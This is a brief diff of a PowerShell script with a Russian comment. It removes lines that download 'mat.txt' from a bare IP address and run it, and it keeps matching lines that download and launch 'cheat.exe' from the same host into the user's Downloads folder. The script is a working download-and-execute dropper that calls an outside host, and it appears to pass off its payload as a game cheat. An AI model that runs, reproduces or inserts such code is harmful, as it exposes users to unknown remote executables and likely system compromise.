@@ -1,8 +1,3 @@
-$uri1 = "http://62.60.179.61:3000/mat.txt"
-$out1 = "$env:USERPROFILE\Downloads\mat.txt"
-Invoke-WebRequest -Uri $uri1 -OutFile $out1
-Start-Process -FilePath $out1
-
 # Скачивание и запуск cheat.exe
 $uri3 = "http://62.60.179.61:3000/cheat.exe"
 $out3 = "$env:USERPROFILE\Downloads\cheat.exe"
